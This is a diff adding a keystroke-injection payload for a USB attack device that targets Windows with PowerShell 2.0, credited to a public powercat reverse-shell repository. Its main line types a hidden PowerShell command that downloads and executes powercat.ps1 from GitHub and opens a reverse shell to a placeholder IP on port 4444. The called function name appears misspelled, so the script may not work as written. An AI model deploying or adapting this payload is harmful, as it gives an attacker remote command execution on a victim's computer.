@@ -1,0 +1,17 @@
+#!/bin/bash
+#Title:   powercat - Powershell v 2.0
+#Author:  Thiago Ferrari
+#Version: 1.0
+#Target: Windows with PS2
+#credits to @besimorhino and https://github.com/rexpository/reverseshell-powercat-v2
+#change the IP address
+
+LED SETUP
+ATTACKMODE HID STORAGE
+Q SET_LANGUAGE BR
+GET SWITCH_POSITION
+
+LED ATTACK
+# Run the payload
+RUN WIN powershell  -WindowStyle hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/rexpository/reverseshell-powercat-v2/main/powercat.ps1');powerrcatt -c 1.1.1.1 -p 4444 -e cmd"
+LED FINISH
